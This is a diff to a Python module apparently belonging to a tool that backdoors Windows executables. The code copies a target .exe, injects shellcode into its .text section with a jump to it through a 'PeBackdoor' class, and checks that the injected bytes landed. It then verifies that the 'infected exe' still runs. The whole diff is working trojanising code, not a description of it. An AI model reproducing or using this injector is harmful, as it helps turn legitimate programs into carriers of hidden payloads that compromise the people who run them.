@@ -9,7 +9,7 @@ from pehelper import *
 from model import *
 from observer import observer
 
-from redbackdoorer import PeBackdoor, Logger, options
+from derbackdoorer.derbackdoorer import PeBackdoor
 
 logger = logging.getLogger("Injector")
 
@@ -24,7 +24,8 @@ def inject_exe(
         shellcode_in, exe_in, exe_out, inject_mode
     ))
 
-    shellcode_len = len(file_readall_binary(shellcode_in))
+    shellcode = file_readall_binary(shellcode_in)
+    shellcode_len = len(shellcode)
 
     # create copy of file exe_in to exe_out
     shutil.copyfile(exe_in, exe_out)
@@ -39,14 +40,12 @@ def inject_exe(
             exe_out
         ])
     
-    options["verbose"] = True
-
     # copy it first...
     temp = tempfile.NamedTemporaryFile(delete=False)
     shutil.copy(exe_out, temp.name)
     outfile = temp.name
 
-    peinj = PeBackdoor(options, Logger)
+    peinj = PeBackdoor()
     result = peinj.backdoor(
         1, # always overwrite .text section
         inject_mode, 
@@ -63,19 +62,15 @@ def inject_exe(
     temp.close()
     os.unlink(temp.name)
 
-    print("Result: {}  and 0x{:x}  0x{:x}".format(
-        result, peinj.shellcodeOffset, peinj.backdoorOffsetRel,
-    ))
-
+    # verify
     code = extract_code_from_exe(exe_out)
-
-    fucking_offset = peinj.backdoorOffsetRel
-
     in_code = code[peinj.shellcodeOffsetRel:peinj.shellcodeOffsetRel+shellcode_len]
-    jmp_code = code[fucking_offset:fucking_offset+12]
-
+    jmp_code = code[peinj.backdoorOffsetRel:peinj.backdoorOffsetRel+12]
     observer.add_code("backdoored_code", in_code)
     observer.add_code("backdoored_jmp", jmp_code)
+
+    if in_code != shellcode:
+        raise Exception("Shellcode injection error")
 
 
 def injected_fix_iat(exe_out: FilePath, exe_info: ExeInfo):
@@ -117,6 +112,6 @@ def verify_injected_exe(exefile: FilePath) -> int:
         os.remove(project.verify_filename)
         return 0
     else:
-        logger.error("---> Verify FAIL. Infected exe does not work (no file created)")
+        logger.warning("---> Verify FAIL. Infected exe does not work (no file created)")
         return 1
 
